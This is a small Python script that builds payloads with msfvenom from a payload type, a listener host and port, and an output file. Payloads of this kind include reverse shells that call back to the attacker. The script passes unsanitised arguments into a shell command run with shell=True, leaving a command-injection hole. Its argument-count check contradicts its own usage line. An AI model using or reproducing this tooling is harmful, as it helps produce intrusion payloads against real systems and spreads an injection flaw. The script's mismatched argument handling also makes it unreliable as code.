import subprocess
import sys
import json

def generate_payload(payload_type, lhost, lport, output_file):
    command = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f raw > {output_file}"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output, error = process.communicate()

    if error:
        return {'error': error.decode()}
    else:
        return {'success': True}

if __name__ == '__main__':
    if len(sys.argv) != 6:
        print("Usage: python generate_payload.py <payload_type> <lhost> <lport> <output_file>")
        sys.exit(1)

    payload_type = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]
    output_file = sys.argv[4]

    result = generate_payload(payload_type, lhost, lport, output_file)

    print(json.dumps(result))
